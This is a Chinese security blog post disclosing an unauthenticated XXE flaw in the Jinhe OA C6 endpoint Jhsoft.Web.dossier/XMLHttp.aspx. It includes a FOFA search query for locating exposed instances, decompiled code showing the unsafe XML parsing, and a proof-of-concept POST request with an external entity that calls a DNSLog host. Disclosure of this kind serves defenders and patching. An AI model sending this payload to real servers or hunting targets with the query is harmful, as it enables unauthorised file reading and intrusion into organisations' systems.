---
title: "金和OA Jhsoft.Web.dossier/XMLHttp.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-dossier-XMLHttp-xxe.html
asset_dir: assets/金和oa-jhsoft.web.dossierxmlhttp.aspx-xxe漏洞
---

# 金和OA Jhsoft.Web.dossier/XMLHttp.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/29 13:31
- 208浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

软件

SQL

XmlHttp

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `Jhsoft.Web.dossier/XMLHttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

脚本语言

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `Jhsoft.Web.dossier/XMLHttp.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Dossier.dll` 将其进行反编译后找到 **XMLHttp** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.InitText();
  this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.Load(this.Request.InputStream);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

深入探索

安全运维咨询

SQL注入检测工具

文件大小转换

```
POST /c6/Jhsoft.Web.dossier/XMLHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

漏洞扫描服务

[![金和OA Jhsoft.Web.dossier/XMLHttp.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
